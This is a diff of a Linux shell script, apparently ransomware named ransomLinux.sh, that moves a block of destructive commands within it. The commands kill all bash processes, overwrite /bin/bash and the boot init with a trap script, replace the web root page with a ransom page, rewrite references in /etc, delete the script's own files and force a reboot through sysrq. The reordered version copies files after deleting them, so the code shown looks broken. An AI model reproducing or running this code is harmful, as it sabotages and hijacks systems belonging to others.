@@ -20,17 +20,6 @@ done
 
 apt install lynx -y 2>&1 >/dev/null
 
-#kill all bash
-kill -9 `lsof | grep /bin/bash | awk '{print $2}'`
-
-cp trapCard.sh /bin/uinit
-chmod +x /bin/uinit
-cp ransom.html /var/www/html/index.html
-cp /bin/bash /bin/bush
-cp /bin/uinit /bin/bash
-
-find /etc -type f -exec sed -i 's|/bin/bash|/bin/bush|' {} \;
-
 #comment out GRUB_CMDLINE_LINUX_DEFAULT
 #GRUB_CMDLINE_LINUX needs to be GRUB_CMDLINE_LINUX="init=/bin/uinit"
 sed -i '/.*GRUB_CMDLINE_LINUX_DEFAULT.*/c\#GRUB_CMDLINE_LINUX_DEFAULT=""' /etc/default/grub
@@ -43,6 +32,17 @@ grub-mkconfig -o /boot/grub/grub.cfg
 rm -f trapCard.sh
 rm -f ransom.html
 rm -f ransomLinux.sh
+
+#kill all bash
+kill -9 `lsof | grep /bin/bash | awk '{print $2}'`
+
+cp trapCard.sh /bin/uinit
+chmod +x /bin/uinit
+cp ransom.html /var/www/html/index.html
+cp /bin/bash /bin/bush
+cp /bin/uinit /bin/bash
+
+find /etc -type f -exec sed -i 's|/bin/bash|/bin/bush|' {} \;
 
 echo 1 > /proc/sys/kernel/sysrq
 echo b > /proc/sysrq-trigger
